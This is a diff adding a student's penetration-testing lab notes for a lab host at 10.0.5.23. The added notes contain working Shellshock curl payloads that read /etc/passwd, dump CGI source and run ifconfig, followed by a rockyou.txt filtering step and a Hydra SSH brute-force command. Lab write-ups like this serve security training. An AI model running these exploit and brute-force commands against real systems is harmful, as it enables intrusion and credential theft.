@@ -41,3 +41,59 @@ After taking our newwst `nmap` scanand outputting it into a text document using 
 
 This takes out output from the txt document anad prints an output that can be pasted into google sheets.
 
+### Vulnerablity Detection
+
+Using the flags wihthin nmap allow us to grab the kernel of a target.
+
+`sudo nmap -O -sV 10.0.5.23`
+
+The info that is found by running this command is:
+
+OS PE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 
+
+OS details: Linux 2.632 - 3.10, Linux 2.6.32 - 3.13, Linux 3.4 - 3.10
+
+
+Using `curl` to gather contents from the apache server is what were tasked to do next. Our main targets are **contents of /etc/passwd** + **code behind cgi** + **running ipconfig on remote computer**. 
+
+To grab the contents of passwd the curl command is used with this formatting:
+`curl -H 'UserAgent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s : '' https://10.0.5.23/cgi-bin/status >> passwrd.txt`
+
+Our output is the stored in `passwrd.txt`, this document then can be used and parsed and `grepped`.
+
+The code behind status cgi is found by runnig a similar curl command:
+
+`curl -H 'UserAgent: () { :; }; echo ; echo ; /bin/cat /usr/bin/cgi-bin/status' bash -s : '' https://10.0.5.23/cgi-bin/status`
+
+This will print out the html which shows the hostname of `10.0.5.23`.
+
+Running `ifconfig` requires us to modify the curl statement once again:
+
+`curl -H 'UserAgent: () { :; }; echo ; echo ; /sbin/ifconfig' https://10.0.5.23/cgi-bin/status`
+
+This will output teh results of an `ifconfig` command on 10.0.5.23.
+
+Using our preoiusly gathered password list we need to find potential passwords. We use a wordlist found wihtin our kali machines. We need to extract the contnents and use this list and our found keyword to filter through passwords. Were given a target number of 28 passwords so we know we have the right keyword.
+
+Using `grep` we can compare the wordlist called "rockyou.txt" to "brutepass.txt"
+
+`grep -i 'samwise' ~/rockyou.txt > brutepass.txt`
+
+This will find the 28 passwords that include our keyword and move them to brutepass.txt
+
+### Using Hydra
+
+Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.
+
+We are using `hydra` and its flags to crack `ssh` using out password list and username we identified earlier.
+
+`hydra -l username -P ~/brutepass.txt 10.0.5.23 -t 4 ssh`
+
+* The `-l` flag identifies the username which must be inputted
+* The `-P` flag allows for a file with a password list to be cycked through in the attempts
+* `ssh` determines the protocol to attack
+
+
+
+
+
